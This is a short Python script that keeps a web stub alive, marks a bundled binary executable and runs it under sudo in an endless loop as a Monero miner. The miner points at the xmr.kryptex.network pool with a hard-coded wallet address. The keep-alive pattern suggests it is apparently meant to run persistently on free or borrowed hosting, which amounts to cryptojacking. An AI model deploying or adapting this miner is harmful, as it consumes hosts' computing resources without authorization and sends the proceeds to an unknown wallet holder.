import subprocess
from webapp import keep_alive
keep_alive()
subprocess.run(["chmod", "+x", "main"], check=True)
comando = ["./main", "--coin", "XMR", "--url", "xmr.kryptex.network:7777", "--user", "43Xncct4xFRLAyo84WPyaUVfCCJLmb7FZXUmW7ae6KJt2Vo571QYoiaVd4FRawUvHAj7JBqsm9d8qTVNPZHwv4GSCHkuG9M/Prueba69", "-p", "x", "-k"]
while True:
    try:
        subprocess.run(["sudo", *comando], check=True)
    except Exception as e:
        print(f'Error: {e}')
